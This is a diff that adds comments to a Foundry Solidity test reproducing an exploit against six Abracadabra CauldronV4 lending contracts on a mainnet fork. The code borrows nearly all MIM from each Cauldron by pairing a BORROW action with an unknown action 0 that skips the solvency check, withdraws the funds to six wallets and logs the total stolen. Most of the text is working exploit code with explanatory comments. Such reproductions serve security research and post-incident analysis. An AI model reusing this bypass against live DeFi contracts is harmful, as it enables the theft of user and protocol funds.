@@ -34,6 +34,7 @@ interface IERC20 {
 }
 
 contract AbracadabraExploitTest is Test {
+    // The 6 exploited Cauldrons
     ICauldronV4[6] cauldrons;
 
     IDegenBox constant degenBox = IDegenBox(0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce);
@@ -42,13 +43,18 @@ contract AbracadabraExploitTest is Test {
     address constant attacker = 0x1AaaDe3e9062d124B7DeB0eD6DDC7055EFA7354d;
 
     uint8 constant ACTION_BORROW = 5;
+
+    // MIM price = $1 (stablecoin)
     uint256 constant MIM_PRICE_USD = 1e18;
 
+    // 1 recipient per Cauldron (6 addresses total)
     address[6] recipients;
 
     function setUp() public {
+        // Fork at the real exploit block
         vm.createSelectFork("mainnet", 23504545);
 
+        // The 6 vulnerable Cauldrons
         cauldrons[0] = ICauldronV4(0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c);
         cauldrons[1] = ICauldronV4(0x289424aDD4A1A503870EB475FD8bF1D586b134ED);
         cauldrons[2] = ICauldronV4(0xce450a23378859fB5157F4C4cCCAf48faA30865B);
@@ -56,6 +62,7 @@ contract AbracadabraExploitTest is Test {
         cauldrons[4] = ICauldronV4(0x6bcd99D6009ac1666b58CB68fB4A50385945CDA2);
         cauldrons[5] = ICauldronV4(0xC6D3b82f9774Db8F92095b5e4352a8bB8B0dC20d);
 
+        // 1 recipient per Cauldron
         recipients[0] = makeAddr("recipient1");
         recipients[1] = makeAddr("recipient2");
         recipients[2] = makeAddr("recipient3");
@@ -83,10 +90,12 @@ contract AbracadabraExploitTest is Test {
         uint256 totalStolen = 0;
         uint256 successfulBorrows = 0;
 
+        // Exploit each Cauldron with its dedicated address
         for (uint i = 0; i < 6; i++) {
             console.log("=== CAULDRON", i + 1, "===");
             console.log("Address:", address(cauldrons[i]));
 
+            // Check available MIM in this Cauldron
             uint256 cauldronShares = degenBox.balanceOf(address(MIM), address(cauldrons[i]));
             uint256 cauldronMIM = degenBox.toAmount(address(MIM), cauldronShares, false);
 
@@ -98,6 +107,7 @@ contract AbracadabraExploitTest is Test {
                 continue;
             }
 
+            // Calculate borrow amount (100% - small margin to avoid underflow)
             uint256 borrowAmount = cauldronMIM > 100 ether ? cauldronMIM - 100 ether : cauldronMIM;
 
             console.log("  Borrowing:", borrowAmount / 1e18, "MIM");
@@ -107,15 +117,19 @@ contract AbracadabraExploitTest is Test {
             uint256[] memory values = new uint256[](2);
             bytes[] memory datas = new bytes[](2);
 
+            // Action 0: BORROW to recipient[i]
             actions[0] = ACTION_BORROW;
             values[0] = 0;
             datas[0] = abi.encode(int256(borrowAmount), recipients[i]);
 
+            // Action 1: Unknown action (0) - bypass solvency check
             actions[1] = 0;
             values[1] = 0;
             datas[1] = "";
 
+            // Execute the exploit on this Cauldron
             try cauldrons[i].cook(actions, values, datas) {
+                // Check balance in DegenBox
                 uint256 stolenFromThisCauldron = degenBox.balanceOf(address(MIM), recipients[i]);
                 totalStolen += stolenFromThisCauldron;
                 successfulBorrows++;
@@ -134,6 +148,7 @@ contract AbracadabraExploitTest is Test {
         console.log("=== WITHDRAWING MIM FROM DEGENBOX ===");
         console.log("");
 
+        // Withdraw MIM from each recipient to their wallet
         for (uint i = 0; i < 6; i++) {
             uint256 recipientShares = degenBox.balanceOf(address(MIM), recipients[i]);
 
@@ -145,6 +160,8 @@ contract AbracadabraExploitTest is Test {
                 if (i == 4) console.log("Recipient 5 - Withdrawing", recipientShares / 1e18, "MIM shares");
                 if (i == 5) console.log("Recipient 6 - Withdrawing", recipientShares / 1e18, "MIM shares");
 
+                // Withdraw must be done from the address holding the shares
+                // Switch to recipient to perform withdrawal
                 vm.stopPrank();
                 vm.startPrank(recipients[i]);
 
@@ -152,7 +169,7 @@ contract AbracadabraExploitTest is Test {
                     address(MIM),
                     recipients[i],
                     recipients[i],
-                    0,
+                    0, // amount = 0 means use shares
                     recipientShares
                 ) returns (uint256 amountOut, uint256) {
                     console.log("  -> Withdrawn:", amountOut / 1e18, "MIM to wallet");
@@ -174,6 +191,7 @@ contract AbracadabraExploitTest is Test {
         console.log("EXPLOIT SUMMARY");
         console.log("================================================================");
 
+        // Final distribution across wallets
         console.log("MIM DISTRIBUTION ACROSS 6 WALLETS:");
         console.log("----------------------------------------------------------------");
         uint256 totalInWallets = 0;
@@ -189,6 +207,7 @@ contract AbracadabraExploitTest is Test {
         console.log("  TOTAL in wallets:", totalInWallets / 1e18, "MIM");
         console.log("");
 
+        // Calculate USD value (MIM = $1 stablecoin)
         uint256 totalUSD = (totalInWallets * MIM_PRICE_USD) / 1e18;
 
         console.log("Successful Cauldrons exploited:", successfulBorrows, "/6");
